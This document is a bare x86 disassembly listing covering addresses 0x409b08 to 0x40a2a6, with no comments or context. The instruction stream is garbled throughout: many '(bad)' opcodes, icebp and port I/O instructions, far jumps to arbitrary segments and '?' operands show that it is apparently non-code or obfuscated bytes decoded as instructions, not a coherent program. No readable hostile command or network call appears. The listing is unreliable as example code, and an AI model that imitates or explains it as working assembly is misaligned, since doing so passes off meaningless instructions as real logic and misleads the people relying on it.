  409b08:	mov    al,ds:0xb837bb96
  409b0d:	dec    eax
  409b0e:	sub    al,0x26
  409b10:	icebp  
  409b11:	add    eax,DWORD PTR [edx+ecx*2+0x4e]
  409b15:	mov    ecx,0xc82a4d4a
  409b1a:	ret    0x88b9
  409b1d:	outs   dx,DWORD PTR fs:[esi]
  409b1f:	jp     0x409af6
  409b21:	sbb    BYTE PTR [edi-0x2e509f2c],dh
  409b27:	call   0xec51358e
  409b2c:	xchg   esi,eax
  409b2d:	xchg   edx,eax
  409b2e:	pushf  
  409b2f:	pop    ss
  409b30:	jg     0x409b00
  409b32:	test   DWORD PTR [ebp-0x632f12d3],ebp
  409b38:	(bad)  
  409b39:	mov    cl,0x75
  409b3b:	add    edi,DWORD PTR [edx]
  409b3d:	jae    0x409b74
  409b3f:	cmp    ebx,DWORD PTR [ecx-0x5d7d00fd]
  409b45:	icebp  
  409b46:	mov    edx,0x4c1e6bc
  409b4b:	retf   0x3f1e
  409b4e:	jmp    0xbf4f759a
  409b53:	shl    BYTE PTR [ecx+0x76],0x1c
  409b57:	ret    
  409b58:	test   DWORD PTR [esi],edi
  409b5a:	imul   edx,DWORD PTR [ecx-0xa],0xffffffd0
  409b5e:	fucomp st(3)
  409b60:	push   edi
  409b61:	jmp    0x409bb5
  409b63:	xlat   BYTE PTR ds:[ebx]
  409b64:	mov    esi,0x29760c67
  409b69:	jle    0x409be0
  409b6b:	fcomp  st(1)
  409b6d:	in     eax,0xc3
  409b6f:	pushf  
  409b70:	ins    DWORD PTR es:[edi],dx
  409b71:	add    eax,0x3d
  409b74:	aaa    
  409b75:	mov    dl,0xb6
  409b77:	imul   esp,DWORD PTR [edx-0x76488e9b],0x77
  409b7e:	ds inc edi
  409b80:	push   eax
  409b81:	adc    BYTE PTR [ecx-0x66f732b8],0xcf
  409b88:	push   edi
  409b89:	push   ss
  409b8a:	push   esi
  409b8b:	dec    ecx
  409b8c:	push   esi
  409b8d:	cmp    eax,0xee10c1
  409b92:	xor    al,0xee
  409b94:	cli    
  409b95:	xlat   BYTE PTR ds:[ebx]
  409b96:	pop    es
  409b97:	shr    BYTE PTR [edx-0x30],1
  409b9a:	icebp  
  409b9b:	in     al,0x79
  409b9d:	(bad)  
  409b9e:	dec    edi
  409b9f:	jecxz  0x409c0a
  409ba1:	fidivr DWORD PTR [eax+eiz*1]
  409ba4:	sbb    BYTE PTR [esi+0x23],ah
  409ba7:	data16 xlat BYTE PTR ds:[ebx]
  409ba9:	mov    dh,0x7d
  409bab:	lods   eax,DWORD PTR ds:[esi]
  409bac:	call   0x1ad3cce5
  409bb1:	cmp    BYTE PTR [esi+0x7875d223],dh
  409bb7:	adc    bh,BYTE PTR [bx+si-0x7a]
  409bbb:	lds    ebx,FWORD PTR [esi+0x2766a415]
  409bc1:	and    eax,DWORD PTR [esi+0x7c]
  409bc4:	mov    esp,0xf23e56d
  409bc9:	jmp    FWORD PTR [ecx+eiz*8-0xf]
  409bcd:	retf   0xb4d9
  409bd0:	inc    esp
  409bd1:	pop    esi
  409bd2:	in     eax,0x2d
  409bd4:	cmp    al,0xa1
  409bd6:	sbb    eax,0xd3505e37
  409bdb:	stos   DWORD PTR es:[edi],eax
  409bdc:	cli    
  409bdd:	xchg   ebx,eax
  409bde:	jns    0x409c0c
  409be0:	push   ebp
  409be1:	dec    esp
  409be2:	mov    ecx,0x777cb3ac
  409be7:	xchg   ebx,eax
  409be8:	fcomi  st,st(4)
  409bea:	mov    DWORD PTR [ebx+0x2f958521],ebx
  409bf0:	sub    al,0xd5
  409bf2:	lds    ebx,FWORD PTR [ebp+0x5b]
  409bf5:	popf   
  409bf6:	ret    0xeb8
  409bf9:	mov    WORD PTR [ebp+0x2],?
  409bfc:	mov    ecx,0x128db5d6
  409c01:	dec    edx
  409c02:	mov    edx,0x9d4995e
  409c07:	mov    ebp,0xf5c5c53e
  409c0c:	lds    esp,FWORD PTR [ebx]
  409c0e:	pop    ebx
  409c0f:	pushf  
  409c10:	add    eax,0xfc3245fc
  409c15:	xor    al,0x24
  409c17:	adc    BYTE PTR [edx+ecx*2-0x12],dh
  409c1b:	pop    edi
  409c1c:	push   ds
  409c1d:	pop    DWORD PTR [edx-0x5d5999b4]
  409c23:	lea    ebp,[edi]
  409c25:	fnstenv [ebx-0x215f7889]
  409c2b:	leave  
  409c2c:	mov    eax,0x46cbba43
  409c31:	cli    
  409c32:	leave  
  409c33:	mov    esi,0x74b85099
  409c38:	push   eax
  409c39:	das    
  409c3a:	mov    bh,0xa
  409c3c:	dec    DWORD PTR [esi]
  409c3e:	ins    BYTE PTR es:[edi],dx
  409c3f:	sub    DWORD PTR [edi+0x6401fc0f],esi
  409c45:	call   0xa47323e0
  409c4a:	jo     0x409c41
  409c4c:	push   cs
  409c4d:	aam    0x24
  409c4f:	inc    esi
  409c50:	dec    edx
  409c51:	test   al,0xb1
  409c53:	aam    0xa4
  409c55:	mov    ebx,0x5ad43739
  409c5a:	ffree  st(6)
  409c5c:	aaa    
  409c5d:	stos   BYTE PTR es:[edi],al
  409c5e:	add    al,0xaf
  409c60:	(bad)  [edi+eax*8+0x60]
  409c64:	xchg   ecx,eax
  409c65:	std    
  409c66:	inc    eax
  409c67:	mov    ebp,0xf2414f50
  409c6c:	int3   
  409c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c6e:	push   edx
  409c6f:	lods   eax,DWORD PTR ds:[esi]
  409c70:	jb     0x409bfa
  409c72:	in     eax,dx
  409c73:	retf   
  409c74:	(bad)
  409c78:	or     ebx,DWORD PTR [edi-0x12541576]
  409c7e:	push   esi
  409c7f:	adc    DWORD PTR [ebp-0x19],ebp
  409c82:	mov    ds:0xc0cc805f,eax
  409c87:	ficomp DWORD PTR [ecx-0x64]
  409c8a:	pop    edx
  409c8b:	fild   WORD PTR [esi-0x65706b7]
  409c91:	pushf  
  409c92:	pusha  
  409c93:	mov    cl,0x4d
  409c95:	jp     0x409d03
  409c97:	nop
  409c98:	retf   
  409c99:	cld    
  409c9a:	and    ebx,DWORD PTR [edx+0x29]
  409c9d:	mov    al,0x9a
  409c9f:	add    DWORD PTR [edx],0xfffffff7
  409ca2:	js     0x409c88
  409ca4:	popa   
  409ca5:	jecxz  0x409cf2
  409ca7:	and    dh,ah
  409ca9:	sbb    dl,ah
  409cab:	pushf  
  409cac:	sub    eax,0x2ee826a3
  409cb1:	popf   
  409cb2:	xchg   edx,eax
  409cb3:	aas    
  409cb4:	xchg   edi,eax
  409cb5:	fsub   DWORD PTR [esi-0x131e7fd8]
  409cbb:	(bad)  [ecx+0x4b374a2a]
  409cc1:	fadd   DWORD PTR [ebp+0x67]
  409cc4:	clc    
  409cc5:	or     eax,0x996daa0c
  409cca:	xor    dl,BYTE PTR [edx+edx*2-0x3a]
  409cce:	into   
  409ccf:	div    ch
  409cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cd2:	int3   
  409cd3:	mov    DWORD PTR [ecx+0x44dba109],esi
  409cd9:	xor    BYTE PTR [ebx-0x49e54d3b],dh
  409cdf:	adc    BYTE PTR [eax-0x5b],ch
  409ce2:	xchg   ebx,eax
  409ce3:	and    eax,0x4e36b82
  409ce8:	xchg   ebp,eax
  409ce9:	das    
  409cea:	(bad)  
  409ceb:	clc    
  409cec:	lds    edx,FWORD PTR [edi]
  409cee:	(bad)  
  409cef:	mov    bh,0xfd
  409cf1:	loopne 0x409ce8
  409cf3:	and    al,0xf1
  409cf5:	out    dx,eax
  409cf6:	dec    ebx
  409cf7:	rcl    DWORD PTR [ebx+0x2fc0f747],0xf1
  409cfe:	push   ecx
  409cff:	leave  
  409d00:	mov    ebp,DWORD PTR [edi+0x486bed23]
  409d06:	cmp    DWORD PTR [esp+eiz*8],edx
  409d09:	jle    0x409d32
  409d0b:	lock mov bh,0xc
  409d0e:	in     al,0x77
  409d10:	xchg   ebx,eax
  409d11:	pop    edi
  409d12:	cdq    
  409d13:	out    0xeb,eax
  409d15:	sub    bh,BYTE PTR [esi+0x17b1ace5]
  409d1b:	mov    ds:0x9af18f4e,al
  409d20:	mov    DWORD PTR [edx],ebx
  409d22:	ds jns 0x409cb3
  409d25:	push   0xfffffff9
  409d27:	ja     0x409ce3
  409d29:	push   ebx
  409d2a:	and    dh,ah
  409d2c:	not    cl
  409d2e:	or     eax,0x720b6819
  409d33:	cdq    
  409d34:	jmp    0x409d80
  409d36:	dec    edx
  409d37:	int    0xf0
  409d39:	pop    esi
  409d3a:	in     al,dx
  409d3b:	and    al,0xd9
  409d3d:	dec    eax
  409d3e:	mov    bh,0x4b
  409d40:	mov    ecx,0x7e666cf
  409d45:	mov    ebp,0x507411b6
  409d4a:	iret   
  409d4b:	cmp    dl,BYTE PTR [edi+ebp*8+0x59bd4e37]
  409d52:	data16 and bh,BYTE PTR ds:0xe7fc26e9
  409d59:	(bad)
  409d5c:	int3   
  409d5d:	xor    DWORD PTR [edx],edi
  409d5f:	test   eax,0x4a8049
  409d64:	pusha  
  409d65:	(bad)  
  409d66:	sbb    al,BYTE PTR [eax-0x1229417a]
  409d6c:	and    edi,DWORD PTR [edi]
  409d6e:	push   ebx
  409d6f:	fistp  DWORD PTR [esi-0xf43f099]
  409d75:	jmp    0x409d2b
  409d77:	or     dh,BYTE PTR [edi+edx*2+0x7]
  409d7b:	xchg   edi,eax
  409d7c:	jnp    0x409db9
  409d7e:	out    0x1,eax
  409d80:	jns    0x409dab
  409d82:	ins    BYTE PTR es:[edi],dx
  409d83:	(bad)  
  409d84:	sub    edx,eax
  409d86:	jne    0x409de9
  409d88:	jae    0x409dcd
  409d8a:	or     esi,eax
  409d8c:	xchg   ecx,eax
  409d8d:	jne    0x409d23
  409d8f:	cmp    esi,DWORD PTR [edx-0x565e26ef]
  409d95:	clc    
  409d96:	mov    WORD PTR ds:0x5f7d3958,?
  409d9c:	pop    es
  409d9d:	mov    dl,0xb7
  409d9f:	xchg   esi,eax
  409da0:	jmp    0xf1cf:0x8c5f13ea
  409da7:	std    
  409da8:	pop    esi
  409da9:	xchg   ebp,eax
  409daa:	nop
  409dab:	mov    dh,0xf
  409dad:	fstp   TBYTE PTR [edi]
  409daf:	retf   0xc508
  409db2:	shl    DWORD PTR [edx+0xc],1
  409db5:	loope  0x409d5c
  409db7:	or     DWORD PTR [ebp+0xd],0xffffffdd
  409dbb:	scas   al,BYTE PTR es:[edi]
  409dbc:	push   eax
  409dbd:	pop    eax
  409dbe:	add    eax,0x46dff4fc
  409dc3:	int3   
  409dc4:	sbb    eax,0xbc66b40a
  409dc9:	fadd   QWORD PTR [ebx]
  409dcb:	(bad)  
  409dcc:	out    0xd5,al
  409dce:	inc    edx
  409dcf:	loopne 0x409d97
  409dd1:	out    0x2,eax
  409dd3:	push   ds
  409dd4:	div    edx
  409dd6:	mov    ch,0xef
  409dd8:	sub    BYTE PTR [edx-0x23a8e36b],0x56
  409ddf:	rol    DWORD PTR [ebp-0x2e037a60],cl
  409de5:	mov    edx,0x4c7fb428
  409dea:	pop    ss
  409deb:	jecxz  0x409dd0
  409ded:	push   ss
  409dee:	jle    0x409e1e
  409df0:	fnsave [ebx+0x2d]
  409df3:	repnz popf 
  409df5:	jo     0x409e20
  409df7:	xlat   BYTE PTR ds:[ebx]
  409df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df9:	inc    ebx
  409dfa:	out    dx,al
  409dfb:	aaa    
  409dfc:	loopne 0x409e76
  409dfe:	fstp   TBYTE PTR [edi+ecx*1+0x44d36f96]
  409e05:	fadd   DWORD PTR [edi]
  409e07:	sbb    esp,DWORD PTR [ecx+eax*2+0x1228a7b0]
  409e0e:	in     eax,0x69
  409e10:	mov    ch,0x1b
  409e12:	fs lock pop ds
  409e15:	cmp    BYTE PTR [edx],ch
  409e17:	dec    edx
  409e18:	bound  eax,QWORD PTR [eax+ebx*8]
  409e1b:	clc    
  409e1c:	push   edi
  409e1d:	loope  0x409e2b
  409e1f:	inc    edi
  409e20:	jle    0x409dc8
  409e22:	jecxz  0x409e27
  409e24:	stc    
  409e25:	test   WORD PTR [eax-0x32e67661],0x4ca8
  409e2e:	mov    edx,0xaf4268cb
  409e33:	es out dx,al
  409e35:	ins    BYTE PTR es:[edi],dx
  409e36:	rcl    DWORD PTR [ecx+0x15],cl
  409e39:	add    esi,DWORD PTR ds:[edx+0x6f]
  409e3d:	fbstp  TBYTE PTR [esi+0x556a47b1]
  409e43:	xchg   ebx,eax
  409e44:	sbb    edx,DWORD PTR [edx+0x1]
  409e47:	div    DWORD PTR [esi]
  409e49:	mov    esp,0xce50ce4b
  409e4e:	and    esi,DWORD PTR [ebx+ebp*4]
  409e51:	add    cl,ch
  409e53:	cmp    cl,BYTE PTR [ebp-0xddaa72d]
  409e59:	ds fwait
  409e5b:	js     0x409e03
  409e5d:	mov    WORD PTR [edx-0xe0e2c6f],ss
  409e63:	push   ss
  409e64:	push   esi
  409e65:	fbstp  TBYTE PTR [ebx+0x70]
  409e68:	mov    edi,eax
  409e6a:	enter  0x1353,0xc9
  409e6e:	fnsave [eax+0x49989d0d]
  409e74:	dec    esp
  409e75:	leave  
  409e76:	in     al,dx
  409e77:	push   0xf55f649a
  409e7c:	enter  0xa1a,0xa8
  409e80:	sbb    eax,0x52a9e284
  409e85:	pop    edi
  409e86:	jb     0x409ef3
  409e88:	cmc    
  409e89:	(bad)  
  409e8a:	and    eax,DWORD PTR [di-0x41]
  409e8e:	push   ebx
  409e8f:	arpl   WORD PTR [ebp+0x7852268b],dx
  409e95:	aad    0xeb
  409e97:	or     edx,edi
  409e99:	cmp    BYTE PTR [esp+edi*8],cl
  409e9c:	adc    DWORD PTR [ecx-0x4c],esi
  409e9f:	or     edi,DWORD PTR [eax+0x63afee8a]
  409ea5:	mov    ebx,0x499250c8
  409eaa:	loope  0x409e40
  409eac:	add    eax,DWORD PTR [ecx+0x61d37588]
  409eb2:	sbb    DWORD PTR [edx+0x4b],edi
  409eb5:	dec    ebx
  409eb6:	(bad)  
  409eb7:	imul   ebx,DWORD PTR [ebx-0x44],0xffffffe6
  409ebb:	(bad)  
  409ebc:	xchg   edx,eax
  409ebd:	push   edi
  409ebe:	pop    ebp
  409ebf:	mov    bh,0xd4
  409ec1:	or     al,0x2c
  409ec3:	jno    0x409ed6
  409ec5:	sahf   
  409ec6:	scas   eax,DWORD PTR es:[edi]
  409ec7:	and    edx,edi
  409ec9:	mov    ch,0x9c
  409ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ecc:	(bad)  
  409ecd:	addr16 repz dec edx
  409ed0:	xor    bh,bh
  409ed2:	jnp    0x409f4a
  409ed4:	or     ebp,ecx
  409ed6:	(bad)  
  409ed7:	lahf   
  409ed8:	sar    dl,1
  409eda:	mov    DWORD PTR es:[eax-0x1e],ebx
  409ede:	nop
  409edf:	pop    ss
  409ee0:	push   cs
  409ee1:	pop    ds
  409ee2:	xor    dl,0x80
  409ee5:	outs   dx,BYTE PTR ds:[esi]
  409ee6:	inc    eax
  409ee7:	xchg   DWORD PTR [ebx],edi
  409ee9:	loop   0x409f54
  409eeb:	(bad)  
  409eec:	jmp    0xded6:0x6a38e7f7
  409ef3:	in     al,0x39
  409ef5:	cdq    
  409ef6:	popa   
  409ef7:	sbb    bh,BYTE PTR [eax-0x23]
  409efa:	inc    edx
  409efb:	mov    ebp,0x807ade24
  409f00:	jno    0x409ecc
  409f02:	or     ecx,ebp
  409f04:	int    0x22
  409f06:	inc    ecx
  409f07:	add    DWORD PTR [ebx],ecx
  409f09:	cmp    bh,BYTE PTR [ebp+0x7e137466]
  409f0f:	dec    edi
  409f10:	clc    
  409f11:	in     al,dx
  409f12:	adc    ebx,DWORD PTR [eax-0x1d]
  409f15:	cmp    eax,DWORD PTR [edx+ebx*1+0x18]
  409f19:	fwait
  409f1a:	push   0x4
  409f1c:	jbe    0x409f66
  409f1e:	adc    DWORD PTR [ebx+0x2b],0x538740af
  409f25:	ss sahf 
  409f27:	mov    dh,0x8e
  409f29:	xor    esp,eax
  409f2b:	mov    edi,0xeda956e2
  409f30:	mov    esi,0xfadc515e
  409f35:	inc    edi
  409f36:	dec    ecx
  409f37:	test   bl,ah
  409f39:	(bad)  
  409f3a:	mov    DWORD PTR [esi+0x72],ebp
  409f3d:	push   0xffffff8e
  409f3f:	push   cs
  409f40:	addr16 dec esp
  409f42:	fdivr  st(5),st
  409f44:	call   0x98ec7fbe
  409f49:	retf   0x7408
  409f4c:	jg     0x409fc3
  409f4e:	cdq    
  409f4f:	test   eax,0x895f44c1
  409f54:	jle    0x409fb2
  409f56:	test   BYTE PTR [ebx],dh
  409f58:	fdivr  st,st(1)
  409f5a:	add    BYTE PTR [edi+0xf5573ad],ah
  409f60:	pop    ebx
  409f61:	lods   eax,DWORD PTR ds:[esi]
  409f62:	pop    ds
  409f63:	mov    eax,0x7e51e66f
  409f68:	mov    edi,0x3b5dd905
  409f6d:	or     ebp,ebp
  409f6f:	jle    0x409f29
  409f71:	xor    al,0x98
  409f73:	mov    ebp,0x812edced
  409f78:	sbb    dl,BYTE PTR [edx]
  409f7a:	fs dec ebp
  409f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7d:	sub    DWORD PTR [edi-0x26],edi
  409f80:	shr    BYTE PTR [ecx+edx*1],cl
  409f83:	pop    edx
  409f84:	adc    al,BYTE PTR [esp+ebx*4]
  409f87:	stos   DWORD PTR es:[edi],eax
  409f88:	dec    esp
  409f89:	xchg   ebx,esp
  409f8b:	push   eax
  409f8c:	push   ss
  409f8d:	dec    eax
  409f8e:	test   al,0xed
  409f90:	repnz dec edx
  409f92:	pop    ds
  409f93:	in     al,dx
  409f94:	aam    0xb6
  409f96:	jl     0x409f45
  409f98:	jmp    0x35de:0xe962b0b1
  409f9f:	test   al,0x74
  409fa1:	mov    eax,ds:0x784df2e0
  409fa6:	scas   eax,DWORD PTR es:[edi]
  409fa7:	jbe    0x409f67
  409fa9:	js     0x409fc1
  409fab:	add    DWORD PTR [ecx-0x7f],ebx
  409fae:	or     BYTE PTR [edi+0x1a],0x40
  409fb2:	daa    
  409fb3:	mov    ecx,0x2635ca00
  409fb8:	jo     0x409f3f
  409fba:	(bad)  
  409fbb:	es xchg dl,cl
  409fbe:	cmp    eax,0xbcc6b3b5
  409fc3:	pop    ds
  409fc4:	sub    BYTE PTR [ebx+ebp*8-0xc],ch
  409fc8:	xor    DWORD PTR gs:[ecx-0x61933383],eax
  409fcf:	es stos BYTE PTR es:[edi],al
  409fd1:	mov    esi,0x50329d25
  409fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd7:	mov    ds:0x9684f84d,eax
  409fdc:	arpl   WORD PTR [ebp-0x14],di
  409fdf:	or     BYTE PTR [eax],0x8b
  409fe2:	mul    edx
  409fe4:	ret    
  409fe5:	sar    DWORD PTR [edx-0x1efbd7a5],1
  409feb:	ret    
  409fec:	popa   
  409fed:	xor    DWORD PTR [ebx-0x3984206b],ebx
  409ff3:	mov    BYTE PTR [ecx-0x126dcae1],cl
  409ff9:	enter  0xbfb7,0x1d
  409ffd:	pop    ebp
  409ffe:	mov    ebx,0x378cbd1b
  40a003:	aam    0x55
  40a005:	push   esp
  40a006:	outs   dx,BYTE PTR ds:[esi]
  40a007:	popf   
  40a008:	mov    esp,0x21f36558
  40a00d:	and    eax,edi
  40a00f:	(bad)  
  40a010:	outs   dx,DWORD PTR ds:[esi]
  40a011:	repz stc 
  40a013:	sbb    ecx,DWORD PTR [edi+0x65]
  40a016:	jle    0x409fe9
  40a018:	inc    eax
  40a019:	(bad)  
  40a01a:	cmp    DWORD PTR [edi-0x17],esp
  40a01d:	in     eax,dx
  40a01e:	and    BYTE PTR ds:0x87c79ae8,dl
  40a024:	xor    BYTE PTR [ecx+0x6cb3a6d],bl
  40a02a:	and    bl,al
  40a02c:	inc    ebx
  40a02d:	xchg   edx,eax
  40a02e:	mov    bh,0x36
  40a030:	aaa    
  40a031:	fidivr DWORD PTR [esi-0x58d08fb1]
  40a037:	cmp    DWORD PTR [eax-0x7e],0x7ca003b0
  40a03e:	and    BYTE PTR [edx-0x2631b8e9],dl
  40a044:	cmp    DWORD PTR [eax-0x4c4d4550],ecx
  40a04a:	and    al,0xb1
  40a04c:	mov    ecx,0xb08aa0bc
  40a051:	gs pop ecx
  40a053:	or     dl,BYTE PTR [ebx+ebx*8]
  40a056:	stc    
  40a057:	adc    ecx,DWORD PTR [ebp+0x2c1667cf]
  40a05d:	into   
  40a05e:	ja     0x40a059
  40a060:	test   al,0x43
  40a062:	shl    DWORD PTR [esi+0x18],1
  40a065:	mov    dl,0xfb
  40a067:	cdq    
  40a068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a069:	fild   QWORD PTR [ecx-0x3b56379c]
  40a06f:	jb     0x40a067
  40a071:	ja     0x40a023
  40a073:	scas   al,BYTE PTR es:[edi]
  40a074:	ja     0x40a0f2
  40a076:	mov    ch,0x6b
  40a078:	mov    ah,BYTE PTR [eax-0x5c0ee68e]
  40a07e:	add    dh,BYTE PTR [ebx+0x3e]
  40a081:	and    BYTE PTR [eax+eax*2+0x18],bl
  40a085:	sbb    al,0x31
  40a087:	sbb    cl,BYTE PTR [edi]
  40a089:	or     al,0x72
  40a08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a08c:	scas   al,BYTE PTR es:[edi]
  40a08d:	imul   esp,DWORD PTR [ebx-0x3bf444c1],0x5d0a6a72
  40a097:	pusha  
  40a098:	clc    
  40a099:	mov    bh,0x41
  40a09b:	aas    
  40a09c:	pop    ebx
  40a09d:	pop    ebx
  40a09f:	push   ebp
  40a0a0:	ds push cs
  40a0a2:	repnz xchg edi,eax
  40a0a4:	mov    ebp,ds
  40a0a6:	loope  0x40a0d1
  40a0a8:	icebp  
  40a0a9:	jae    0x40a12a
  40a0ab:	push   edi
  40a0ac:	fistp  QWORD PTR [ecx+0x94fdbb5]
  40a0b2:	and    BYTE PTR [edx-0x735d9c8f],cl
  40a0b8:	stos   BYTE PTR es:[edi],al
  40a0b9:	jmp    0x40a09f
  40a0bb:	das    
  40a0bc:	jno    0x40a042
  40a0be:	mov    gs,WORD PTR [ecx+0x7c1a59b9]
  40a0c4:	bound  eax,QWORD PTR [bx+di-0x429c]
  40a0c9:	mov    ah,0x9
  40a0cb:	xlat   BYTE PTR ds:[ebx]
  40a0cc:	jmp    0x3250:0xc77e94d8
  40a0d3:	cmc    
  40a0d4:	adc    dh,dh
  40a0d6:	das    
  40a0d7:	sar    esi,1
  40a0d9:	jmp    0x40a150
  40a0db:	mov    ah,0x55
  40a0dd:	or     BYTE PTR [ebx-0x5272fba5],0xc8
  40a0e4:	pop    eax
  40a0e5:	call   0xc63c68bf
  40a0ea:	aam    0x0
  40a0ec:	dec    ecx
  40a0ed:	jns    0x40a086
  40a0ef:	push   0xffffffb7
  40a0f1:	test   al,0x95
  40a0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0f4:	ss ss pop ecx
  40a0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f8:	sbb    BYTE PTR [esi],dl
  40a0fa:	add    al,0xfe
  40a0fc:	call   0xbcbe378
  40a101:	pop    edi
  40a102:	xchg   ecx,eax
  40a103:	loope  0x40a0f2
  40a105:	push   0x6
  40a107:	enter  0x8105,0xe8
  40a10b:	aam    0xa0
  40a10d:	inc    esi
  40a10e:	(bad)  [edx+0x19afa0b6]
  40a114:	int    0x68
  40a116:	fs ror edx,cl
  40a119:	xor    eax,0x2ac3c60e
  40a11e:	adc    DWORD PTR [ebx],edi
  40a120:	mov    es,WORD PTR [edi+0x7124792b]
  40a126:	mov    ss,WORD PTR [eax-0x1cbeda50]
  40a12c:	cld    
  40a12d:	pop    ss
  40a12e:	xchg   esp,eax
  40a12f:	xchg   ebx,eax
  40a130:	mov    ch,0x54
  40a132:	neg    DWORD PTR ds:0xeb60e586
  40a138:	sub    al,0xad
  40a13a:	stos   BYTE PTR es:[edi],al
  40a13b:	jnp    0x40a15d
  40a13d:	xor    eax,0x7949df14
  40a142:	ja     0x40a132
  40a144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a145:	jg     0x40a173
  40a147:	syscall 
  40a149:	xchg   esp,eax
  40a14a:	repz repz call FWORD PTR gs:0x2343fd2e
  40a153:	daa    
  40a154:	mov    WORD PTR [ecx-0x32413734],ds
  40a15a:	jae    0x40a1c6
  40a15c:	dec    ebx
  40a15d:	(bad)  
  40a15e:	outs   dx,BYTE PTR ds:[esi]
  40a15f:	dec    ebx
  40a160:	push   DWORD PTR [esi-0x25]
  40a163:	loop   0x40a104
  40a165:	les    ebp,FWORD PTR [edx+0x51]
  40a168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a169:	and    eax,ebp
  40a16b:	jg     0xf6c5cb43
  40a171:	mov    BYTE PTR [ebx],ah
  40a173:	pop    ss
  40a174:	ja     0x40a14b
  40a176:	sub    al,0x0
  40a178:	arpl   WORD PTR [edi-0x44],dx
  40a17b:	dec    ebx
  40a17c:	pop    esi
  40a17d:	ins    BYTE PTR es:[edi],dx
  40a17e:	data16 into 
  40a180:	aam    0xe5
  40a182:	aaa    
  40a183:	out    0x5d,al
  40a185:	pop    ss
  40a186:	int    0x18
  40a188:	dec    ebp
  40a189:	scas   eax,DWORD PTR es:[edi]
  40a18a:	out    0xc6,al
  40a18c:	fwait
  40a18d:	xchg   ebp,eax
  40a18e:	adc    al,0x6e
  40a190:	add    al,BYTE PTR [edi]
  40a192:	pushf  
  40a193:	cmp    DWORD PTR [ecx-0x3b],esp
  40a196:	jnp    0x40a19f
  40a198:	push   ebp
  40a199:	int    0x3
  40a19b:	push   ecx
  40a19c:	ss nop
  40a19e:	mov    WORD PTR [esi],gs
  40a1a0:	or     DWORD PTR [ecx-0x1ae0313c],ecx
  40a1a6:	call   FWORD PTR [ebx+0x19c11e8e]
  40a1ac:	inc    eax
  40a1ad:	pushf  
  40a1ae:	dec    esi
  40a1af:	loope  0x40a181
  40a1b1:	inc    esi
  40a1b2:	cmp    BYTE PTR [ecx],0x65
  40a1b5:	es shr esp,0x4
  40a1b9:	leave  
  40a1ba:	jecxz  0x40a205
  40a1bc:	(bad)  
  40a1bd:	mov    cl,BYTE PTR [esi+0x39b7bd9e]
  40a1c3:	xor    DWORD PTR [ecx],esp
  40a1c5:	adc    al,0xf4
  40a1c7:	enter  0x82fb,0x1b
  40a1cb:	push   esi
  40a1cc:	aad    0x37
  40a1ce:	es push edx
  40a1d0:	in     al,0x3f
  40a1d2:	sbb    esi,DWORD PTR [edx-0x2f2df153]
  40a1d8:	int3   
  40a1d9:	in     eax,0xa
  40a1db:	cli    
  40a1dc:	cdq    
  40a1dd:	lods   al,BYTE PTR ds:[esi]
  40a1de:	or     al,0x21
  40a1e0:	and    eax,0xdd4d29c3
  40a1e5:	sub    ecx,DWORD PTR [eax]
  40a1e7:	gs xchg ebx,eax
  40a1e9:	dec    esp
  40a1ea:	out    dx,al
  40a1eb:	cmp    DWORD PTR ds:0xce69c936,0x584df78d
  40a1f5:	iret   
  40a1f6:	xor    esi,DWORD PTR [eax-0x42d676e5]
  40a1fc:	imul   esi,DWORD PTR [esi],0x9d4f2dbb
  40a202:	icebp  
  40a203:	or     eax,0x782df231
  40a208:	and    BYTE PTR [edx-0x75],cl
  40a20b:	xchg   BYTE PTR [ebx+0x15],ah
  40a20e:	sub    BYTE PTR ss:[ebx],dl
  40a211:	or     al,0xa2
  40a213:	inc    ebp
  40a214:	jo     0x40a1d7
  40a216:	mov    ah,0xbe
  40a218:	mov    ebp,0xdc5632ce
  40a21d:	repz retf 
  40a21f:	xchg   ebx,eax
  40a220:	cmp    dl,BYTE PTR [ebp-0x8]
  40a223:	neg    BYTE PTR [edx+0x3a8282d5]
  40a229:	mov    bl,0x65
  40a22b:	xchg   esi,eax
  40a22c:	out    dx,al
  40a22d:	or     edx,DWORD PTR [ebp-0x1bb693cd]
  40a233:	sub    DWORD PTR [edi],ebx
  40a235:	mov    ah,0xd7
  40a237:	(bad)  
  40a23a:	mov    esp,0x897e6c20
  40a23f:	pop    edx
  40a240:	xchg   ecx,eax
  40a241:	or     al,0xdd
  40a243:	xor    esp,ecx
  40a245:	int3   
  40a246:	dec    DWORD PTR ds:0x3b31976b
  40a24c:	dec    ecx
  40a24d:	xor    esi,DWORD PTR [ebx+0x71]
  40a250:	add    ecx,0xb365351d
  40a256:	and    BYTE PTR [esi],al
  40a258:	cwde   
  40a259:	xor    BYTE PTR [esi+0x3a20e7c1],cl
  40a25f:	xchg   DWORD PTR [edi],ebx
  40a261:	add    BYTE PTR [ebp+0x11],ah
  40a264:	ins    BYTE PTR es:[edi],dx
  40a265:	std    
  40a266:	sub    cl,BYTE PTR [esi]
  40a268:	pop    ds
  40a269:	cmp    esp,ebx
  40a26b:	cdq    
  40a26c:	iret   
  40a26d:	push   ecx
  40a26e:	loopne 0x40a2ac
  40a270:	aaa    
  40a271:	stc    
  40a272:	inc    esp
  40a273:	mov    cl,0x3f
  40a275:	mov    ecx,0xad5e5848
  40a27a:	add    ebx,DWORD PTR [edi-0x62]
  40a27d:	jno    0x40a272
  40a27f:	mov    dh,0x54
  40a281:	call   0xca7c:0x897998ec
  40a288:	mov    DWORD PTR [eax-0x7a6f92ee],0x524e9de1
  40a292:	mov    dh,0xeb
  40a294:	jge    0x40a29e
  40a296:	mov    WORD PTR [edx+0x50ea917e],es
  40a29c:	mov    eax,0xbf07c844
  40a2a1:	es addr16 pop eax
  40a2a4:	adc    bh,BYTE PTR [esi]
  40a2a6:	sub    al,0x19
